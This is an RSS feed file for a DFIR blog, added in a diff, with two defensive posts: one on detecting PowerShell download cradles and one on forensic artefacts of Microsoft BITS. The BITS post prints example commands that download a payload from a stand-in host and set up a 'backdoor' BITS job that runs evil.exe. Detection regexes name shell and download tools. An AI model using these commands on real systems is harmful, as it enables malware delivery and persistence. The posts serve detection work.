@@ -1,0 +1,846 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Matt&#39;s DFIR blog</title>
+    <description>A blog for DFIR thoughts, research and future reference
+</description>
+    <link>https://mgreen27.github.io/</link>
+    <atom:link href="https://mgreen27.github.io/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Thu, 05 Apr 2018 00:05:08 +1000</pubDate>
+    <lastBuildDate>Thu, 05 Apr 2018 00:05:08 +1000</lastBuildDate>
+    <generator>Jekyll v2.4.0</generator>
+    
+      <item>
+        <title>Powershell Download Cradles</title>
+        <description>&lt;p&gt;In this post I thought I would share some information on Powershell download cradles I put together recently. I’m going to provide an overview, highlighting areas I found interesting thinking about detection from both network and endpoint views.&lt;/p&gt;
+
+&lt;p&gt;I have also included a link to a results summary and a noisemaker script I have been using to test. I focused on Powershell download cradles, or more specifically cradles that I could execute a Powershell payload. I have also not included all the .NET methods that seem to be effectively the same as Powershell WebClient. &lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;so-what-is-a-cradle-and-why-do-i-care&quot;&gt;So what is a cradle and why do I care?&lt;/h1&gt;
+&lt;p&gt;A download cradle is a single line command for download and code execution. Typically seen at the end of a maldoc or exploit, implementing the second stage download of exploit/infection within the attack lifecycle. A download cradle can also be part of a persistence mechanism, tooling or execution at other attack stages when an attacker attempts to download capability or run fileless.&lt;/p&gt;
+
+&lt;p&gt;From an evil standpoint - the best download cradles are proxy, credential and https aware so will slide right by a corporate firewall.
+For defenders, obtaining visibility and focusing detection at a common attack chokepoint, we can minimize impact effectively.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_CLI_ALL.png&quot; alt=&quot;There is a large menu of evil download cradles - a selection with un-obfuscated CommandLine&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;network-detection&quot;&gt;Network Detection&lt;/h1&gt;
+&lt;p&gt;Network is usually the easiest point of visibility but can be noisy looking at unfiltered events. I have found interesting use cases baselining current activity then spotting deviations from normal filtering on User-Agent, content, http method, destination domain and URL.&lt;/p&gt;
+
+&lt;p&gt;Understanding the traffic behavior for each cradle and whitelisting trusted components is a good start on building out detection.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Technique&lt;/th&gt;
+      &lt;th&gt;Method: User-Agent&lt;/th&gt;
+      &lt;th&gt;Notes&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Powershell WebClient&lt;br /&gt;or  XmlRequest&lt;/td&gt;
+      &lt;td&gt;GET: $Null&lt;/td&gt;
+      &lt;td&gt;Extremely noisy and you may find alternate endpoint detection below is the best path beyond a standard content based approach. User-Agent is trivial to change.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Invoke-WebRequest&lt;br /&gt;Invoke-RequestMethod&lt;/td&gt;
+      &lt;td&gt;GET: Mozilla/* (Windows NT; Windows NT *; *) WindowsPowerShell/*&lt;/td&gt;
+      &lt;td&gt;Easy to detect and baseline all traffic using a search for User-Agent=*WindowsPowershell*. User-Agent is trivial to change.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;PowerShell Word COM Object&lt;br /&gt;&amp;amp; Excel COM Object&lt;/td&gt;
+      &lt;td&gt;OPTIONS: Microsoft Office *&lt;br /&gt; HEAD: Microsoft Office *&lt;br /&gt; HEAD: Microsoft Office Existence Discovery&lt;br /&gt; GET: Mozilla/* (compatible; MSIE *; Windows NT * Trident/*; .NET *; .NET CLR *; ms-office; MSOffice*)&lt;/td&gt;
+      &lt;td&gt;Bucketing for multiple methods by URL over a few seconds reduces noise significantly. Legitimate activity typically GET and involves document content.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Powershell IE COM Object&lt;/td&gt;
+      &lt;td&gt;GET: Mozilla/* (Windows NT *; WOW64; Trident/*; rv:*) like Gecko&lt;/td&gt;
+      &lt;td&gt;Extremely noisy and you may find alternate endpoint detection below is the best path beyond a standard content based approach.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Powershell MsXml COM&lt;br /&gt;&amp;amp; WinHttp COM&lt;/td&gt;
+      &lt;td&gt;GET: Mozilla/* (compatible; Win32; WinHttp.WinHttpRequest.*)&lt;/td&gt;
+      &lt;td&gt;Does not appear to be proxy aware, so understanding this context (and response codes!) may be helpful in determining priority.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Microsoft BITS&lt;/td&gt;
+      &lt;td&gt;HEAD: Microsoft BITS/*&lt;br /&gt;GET: Microsoft BITS/*&lt;/td&gt;
+      &lt;td&gt;Fairly simple to basline as Microsoft BITS typically requests Windows Update, application and media domain content.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Microsoft CertUtil&lt;/td&gt;
+      &lt;td&gt;GET: CertUtil URL Agent&lt;br /&gt; GET: Microsoft-CryptoAPI/*&lt;/td&gt;
+      &lt;td&gt;Easy to baseline as typically involves certificate related traffic to a fairly static set of domains.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;regsvr32&lt;br /&gt;run32dll&lt;br /&gt;mshta.exe&lt;/td&gt;
+      &lt;td&gt;GET: Mozilla/* (compatible; MSIE *; Windows NT * Trident/*; .NET*; .NET CLR *)&lt;/td&gt;
+      &lt;td&gt;Another relatively noisy User-Agent, focus on content and endpoint.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;WebDAV&lt;/td&gt;
+      &lt;td&gt;Microsoft-WebDAV-MiniRedir/*&lt;/td&gt;
+      &lt;td&gt;WebDAV GET requests are very sparse and simple to detect evil if monitored.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;DnsTxtRecord&lt;/td&gt;
+      &lt;td&gt;N/A&lt;/td&gt;
+      &lt;td&gt;N/A in most orgs. DNS TXT traffic is typically DMARC related, very large encoded responses for unusual requests are immediately suspicious&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;endpoint-detection&quot;&gt;Endpoint Detection&lt;/h1&gt;
+&lt;p&gt;Endpoint visibility enables the lions share of quality detection opportunities and bypasses network encryption limitations. I see several main visibility areas that highlight the benefit of modern endpoint capability in addition to network monitoring.&lt;/p&gt;
+
+&lt;h3 id=&quot;process-image-chains&quot;&gt;Process Image Chains&lt;/h3&gt;
+&lt;p&gt;One of the most well-known methods for spotting evil is parent / child process relationships. A shell, script interpreter or loader as a child to a commonly exploited program may indicate some type of evil leading to the use of a download cradle.&lt;br /&gt;
+&lt;br /&gt;
+Some examples:&lt;br /&gt;
+&lt;small&gt;Parent: &lt;code&gt;(?i).*\\(winword|excel|powerpnt|mspub|visio|outlook)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;
+&lt;small&gt;Child: &lt;code&gt;(?i).*\\(cmd|powershell|cscript|wscript|wmic|regsvr32|schtasks|rundll32|mshta|hh)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;&lt;/small&gt;&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;Similarly WmiPrvSE, a shell or script interpreter as parent may indicate a process chain of &lt;br /&gt;cradle execution.&lt;br /&gt;
+&lt;br /&gt;
+Some examples:&lt;br /&gt;
+&lt;small&gt;Parent: &lt;code&gt;(?i).*\\(mshta|powershell|cmd|rundll32|cscript|wscript|wmiprvse.exe)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;
+&lt;small&gt;Child: &lt;code&gt;(?i).*\\(cmd|powershell|schtasks|reg|nslookup|certutil|bitsadmin)\.exe&lt;/code&gt;&lt;small&gt;&lt;/small&gt;&lt;br /&gt;&lt;/small&gt;&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;Some of these process relationships may be legitimate in a large environment so appropriate baselining is recommended. A mature blue team understands expected process image and chain mappings to spot deviation from normal. A mature team is also able to spot new and unusual process paths across multigenerational chains.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_chain.png&quot; alt=&quot; Process chain from a cradle triggered by opening a maldoc&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;command-line&quot;&gt;Command Line&lt;/h3&gt;
+&lt;p&gt;Considering process command line makes the blue team’s job much easier by adding another whitelistable data point to the process chain stack.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_CLI.png&quot; alt=&quot; DDE attack (top) and WMI based macro (bottom)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Some of the gaps to this method as a standalone technique is command line obfuscation. Obfuscation is an extreamly large area and to give coverage justice, I have included a link in my references below to some excellent research by Daniel Bohannon (Invoke-CradleCrafter was a huge influence on some of the types of cradles I tested).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_CLI_03.png&quot; alt=&quot;This download cradle was generated by Daniel Bohannon&#39;s excellent obfuscation toolsets.&quot; /&gt;
+From a defenders standpoint, obfuscation can defeat specific command line detection, however itself is an indicator. Understanding process chains and their command line enables defenders to whitelist known good and spot abnormalities.&lt;/p&gt;
+
+&lt;p&gt;Its also worthy to note, depending on the obfuscation type - enabling latest Powershell version 5.x script block logging and Windows10 Anti-Malware Scan Interface equipped tools can assist detection of obfuscated Powershell payloads at runtime.&lt;/p&gt;
+
+&lt;h3 id=&quot;module-loads&quot;&gt;Module loads&lt;/h3&gt;
+&lt;p&gt;Module loads provide another unique visibility point vital for modern endpoint based detection. For an attacker living off the land it is impossible for a download cradle to operate without network based modules. Below you can see an example of Powershell loaded network modules during execution.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_module.png&quot; alt=&quot; Powershell Webclient network module loads&quot; /&gt;
+Some good examples I picked out of my dataset are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Powershell.exe loading rasman.dll and rasapi32.dll (Powershell Webclient methods)&lt;/li&gt;
+  &lt;li&gt;Powershell.exe loading ieproxy.dll (Powershell IE COM methods)&lt;/li&gt;
+  &lt;li&gt;Powershell.exe loading wininet.dll (Common network module)&lt;/li&gt;
+  &lt;li&gt;Powershell.exe loading msxml3.dll (Powershell MsXml COM)&lt;/li&gt;
+  &lt;li&gt;Powershell.exe loading qmgrprxy.dll or Microsoft.BackgroundIntelligentTransfer.Management.Interop.dll (Powershell BITS)&lt;/li&gt;
+  &lt;li&gt;Certutil.exe loading wininet.dll&lt;/li&gt;
+  &lt;li&gt;regsvr32.exe loading scrobj.dll and wininet.dll (Squiblydoo)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Keep in mind, the list above is focused on Powershell cradles. I have seen downloaders implemented for COM objects from vbscript and other languages so it may be worth also considering module loads more heuristically - e.g common script interpreters. Module visibility is key.&lt;/p&gt;
+
+&lt;h3 id=&quot;network-connections&quot;&gt;Network connections&lt;/h3&gt;
+&lt;p&gt;Network connections from the endpoints view provides additional context to detect bad. A mature blue team can collect and baseline network connections by process and user context. In most environments, powershell.exe (and others) would be unexpected connecting to the internet on a standard user endpoint.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_network.png&quot; alt=&quot;Network activity by process - importance of endpoint context&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;file-write-events&quot;&gt;File write events&lt;/h3&gt;
+&lt;p&gt;Despite most Powershell download cradles in my list above being classed as memory resident, there are some that write payloads and artefacts. In the example below of particular interest in the Internet Explorer and Office COM object methods are the cached and *.url link files for downloaded file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_file.png&quot; alt=&quot;A selection of Powershell Office COM object file writes - url files are link files that will provide path and file downloaded&quot; /&gt;
+Monitoring for unusual file writes by Powershell, certutil.exe and bitsadmin.exe are other simple techniques enabled by visibility that can be used to detect download cradle activity.&lt;/p&gt;
+
+&lt;h3 id=&quot;registry&quot;&gt;Registry&lt;/h3&gt;
+&lt;p&gt;Not all download cradles I looked at had specific registry IOCs that were worth monitoring. An exception is the existence of powershell_RASMANCS and powershell_RASAPI32 tracing keys that are evidence of Powershell network communication.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_registry.png&quot; alt=&quot;Monitor for activity to HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS and HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;other-artefacts&quot;&gt;Other Artefacts&lt;/h3&gt;
+&lt;p&gt;I would expect all modern EDR vendors to provide event visibility of the above artifacts as standard. However, in real world situations, agent coverage may be incomplete or we may be getting into the fight late for event telemetry.&lt;/p&gt;
+
+&lt;p&gt;With that in mind, a component for download cradle detection is traditional forensic capability. Evidence of execution, registry, event logs or volatile data analysis spotting similar artifacts to the event data above is the obvious starting point. In the example below I have highlighted a prefetch entry with reference to the handle to some of the DLLs listed above.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-04-02-DownloadCradle/Powershell_prefetch.png&quot; alt=&quot;Evidence of Execution - Powershell Webclient method&quot; /&gt;
+Microsoft BITS also has some specific forensic artifacts I have previously covered in another post that I have included in my references below.&lt;/p&gt;
+
+&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;Network and endpoint visibility should be priority of all blue teams. Although focusing on a small section of the attack lifecycle, this post has been an overview of some of the areas I found interesting when thinking about download cradle detection. Understanding offensive technique and forensic artifacts enables blue teams to write high quality detections near the top the pyramid of pain. Correlating this data towards your own visibility levels, blue teams can work towards improvement and optimising resources for both detection and response.&lt;/p&gt;
+
+&lt;p&gt;Let me know if you have any questions. I have added my &lt;a href=&quot;https://github.com/mgreen27/mgreen27.github.io/tree/master/other/DownloadCradle&quot;&gt;testing results and script here&lt;/a&gt;. I would be interested to hear results testing these out on different vendors.&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+&lt;p&gt;1) Arno0x0x. &lt;a href=&quot;https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/&quot;&gt;Windows oneliners to download remote payload and execute arbitrary code&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;2) Bohannon, Daniel. &lt;a href=&quot;https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf&quot;&gt;DOSfuscation whitepaper&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;3) Bohannon, Daniel. &lt;a href=&quot;https://github.com/danielbohannon/Invoke-Obfuscation&quot;&gt;Invoke-Obfuscation&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;4) Bohannon, Daniel. &lt;a href=&quot;http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-cradlecrafter-overview&quot;&gt;The Invoke-CradleCrafter Overview&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;5) Bohannon, Daniel. Holmes, Lee &lt;a href=&quot;https://github.com/danielbohannon/Revoke-Obfuscation&quot;&gt;Revoke-Obfuscation&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;6) HarmJ0y. &lt;a href=&quot;https://gist.github.com/HarmJ0y/bb48307ffa663256e239&quot;&gt;DownloadCradles.ps1&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;7) Have You Secured? &lt;a href=&quot;https://haveyousecured.blogspot.com.au/2017/07/taking-closer-look-at-powershell.html&quot;&gt;Taking a Closer Look at PowerShell Download Cradles&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;8) Green, Matthew. &lt;a href=&quot;https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html&quot;&gt;Sharing my BITS&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 02 Apr 2018 00:00:00 +0000</pubDate>
+        <link>https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</guid>
+        
+        
+        <category>posts</category>
+        
+      </item>
+    
+      <item>
+        <title>Sharing my BITS</title>
+        <description>&lt;p&gt;I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on download cradles and an interest in the client side forensics. I’m going to give a brief background, talk about some nuances in collection types and provide some background information when I was thinking about detection.&lt;/p&gt;
+
+&lt;h1 id=&quot;what-is-bits-and-why-do-we-care&quot;&gt;What is BITS and why do we care?&lt;/h1&gt;
+&lt;p&gt;Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. Part of all modern Windows systems from 2000+, the most well known use for BITS is Windows updates and other Windows transfer tasks.&lt;/p&gt;
+
+&lt;p&gt;BITS has many interesting features including firewall whitelisted and proxy capable file transfer. BITS can also be configured on a schedule, with prioritisation or throttled transfer over idle network bandwidth. Additional “evil friendly” features are the ability to execute a command line option post job (persistence use case) and transfer policy. A newer feature is peer caching where subnet peer machines can be used as a cache for file downloads.&lt;/p&gt;
+
+&lt;p&gt;In short that means BITS fits the profile as a candidate for attackers “living off the land”. Managed via a COM based API, Powershell or a built in binary (bitsadmin.exe), BITS can be used easily throughout the attack lifecycle.&lt;/p&gt;
+
+&lt;p&gt;For those interested in digging further, I have included some detailed links on capabilities and configuration in my references below.&lt;/p&gt;
+
+&lt;h1 id=&quot;artefact-creation&quot;&gt;Artefact creation&lt;/h1&gt;
+&lt;p&gt;Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Bits download initiated via Powershell&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Start-BitsTransfer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Source&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.totallylegitinappnews.com/mimi.jpg&amp;quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Destination&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;c:\Windows\vss\mimi.exe&amp;quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Peristence via bitsadmin.exe&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitsadmin&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitsadmin&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addfile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.totallylegitinappnews.com/evil.exe&amp;quot;&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&amp;quot;c:\windows\VSS\evil.exe&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitsadmin&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SetNotifyCmdLine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VSS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NULL&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitsadmin&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resume&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backdoor&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.&lt;/p&gt;
+
+&lt;h1 id=&quot;collection---network&quot;&gt;Collection - Network&lt;/h1&gt;
+&lt;p&gt;Network is by far the easiest collection point via typical web traffic filtering on user agent string and whitelisted domains. Although I have found everything from Windows, to application, to news traffic, with most BITS traffic is fairly static over time. I have found interesting use cases baselining current activity then spotting deviations from normal focusing on content, http method, destination and URL.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-02-18-Sharing_My_BITS/01pcap.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
+
+&lt;p&gt;Limitations in some environments are the obvious here: encrypted traffic. This method will also miss BITS setup with notification command line and not reaching out of the network.&lt;/p&gt;
+
+&lt;h1 id=&quot;collection---endpoint&quot;&gt;Collection - Endpoint&lt;/h1&gt;
+&lt;p&gt;Endpoint is by far the most detailed collection point, but generally the most difficult to master. I have broken out the endpoint into various sections to provide insights. “Defending off the land”, my goals are to find a lightweight collection capability to pull into a scripted solution without pre installation or change of audit policy. Unfortunately, that means probably the most valuable detection points: event monitoring via EDR, Sysmon and EventID 4688 (Process Creation + CLI) events are out, however some of the artefacts can be collected via EDR tools.&lt;/p&gt;
+
+&lt;h2 id=&quot;bits-job-configuration&quot;&gt;Bits job configuration&lt;/h2&gt;
+&lt;p&gt;BITS can be configured and jobs reviewed using either Powershell command-lets or bitsadmin.exe. Limitations on this type of collection are: unless collected during the transfer, only scheduled jobs are available.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-02-18-Sharing_My_BITS/02powershell.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In my testing, both methods provide similar granular information on job details, however Bitsadmin does provide additional context. In my example below you can see additional configuration of the notification command line feature, also bypassing Autoruns detection.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-02-18-Sharing_My_BITS/03powershell.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;qmgr-database&quot;&gt;QMGR database&lt;/h2&gt;
+&lt;p&gt;Queue Manager queues store job specification and state. Typically located at: C:\ProgramData\Microsoft\Network\Downloader. For pre-Windows 10 systems, QMGR is stored in files named qmgr0.dat or qmgr1.dat.&lt;/p&gt;
+
+&lt;p&gt;Limitations are: Microsoft has migrated to ESE database format for Queue Manager in Windows 10 and beyond leaving with a solution that would only work on some current systems.&lt;/p&gt;
+
+&lt;p&gt;These are the files parsed by the ANSSI tool - bits_parser. Initially I toyed with the idea of a light weight binary parser in Powershell, to replicate bits_paser in non carving mode and roll in seperate capability for Windows 10.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-02-18-Sharing_My_BITS/04bitsparser.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Results worked but led me to the second limitation: visibility is focused on scheduled or recent jobs. Thats is great for the BITS persistence use case but single BITS tasks can rotate out of the Queue Manager quickly and may not be recoverable even with carving. Assuming available data, I also found carving in Powershell was too resource intensive for a light weight collection so the preferred method would be to collect and parse offline if carving is required.&lt;/p&gt;
+
+&lt;h2 id=&quot;windows-event-logs&quot;&gt;Windows Event logs&lt;/h2&gt;
+&lt;p&gt;Focusing on default event logs, the best source for detection of malicious download is the Microsoft-Windows-Bits-Client/Operational log. These logs hold: state, source, user and some file information for each BITS transfer. This event log also appears to be similar across Windows 7 through 10 so fits the profile and a good endpoint collection source.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-02-18-Sharing_My_BITS/05eventlogs.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
+
+&lt;p&gt;Limitations include: sparse data, logs are spread over several EventIDs and potentially a lot of entries in a production environment making it difficult to spot evil hiding in the noise. This log will also not shed light on abuse of BITS for persistence unless there was a network transfer to a suspicious domain as part of the configured job.&lt;/p&gt;
+
+&lt;p&gt;Writing a script to pull all EventID 59 events, highlighting some of the available information from the event: Time (converted to UTC), JobName and Source URL we can see the kind of noise to expect in a few hours activity.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-02-18-Sharing_My_BITS/06bitsdetectall.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Following similar concepts to network based detection, I was able to build a whitelist for common domains from my network logs and whitelist out most of the noise potentially seen day to day.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-02-18-Sharing_My_BITS/07bitsdetect.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This method may be particularly helpful in environments that may have limitations on network encryption visibility. Some work is required to build out the whitelist with lots of outliers in a large network.&lt;/p&gt;
+
+&lt;p&gt;My content is &lt;a href=&quot;https://github.com/mgreen27/Invoke-BitsParser&quot;&gt;available here&lt;/a&gt;. Some of the other features I have added are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Configuration of days back to search (default 14).&lt;/li&gt;
+  &lt;li&gt;A switch (“-All”) to list all entries available in the logs to collect data to rejig whitelists from an endpoint view.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;I couldn’t finish this post without talking a little about capabilities all organisations should aspire to. Gold standard should be a mix of network and endpoint based visibility, with the ability to cover all gaps from each single source.&lt;/p&gt;
+
+&lt;p&gt;Critical for a modern blue team, some of my recommendations are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Network based visibility around encrypted web traffic with content inspection.&lt;/li&gt;
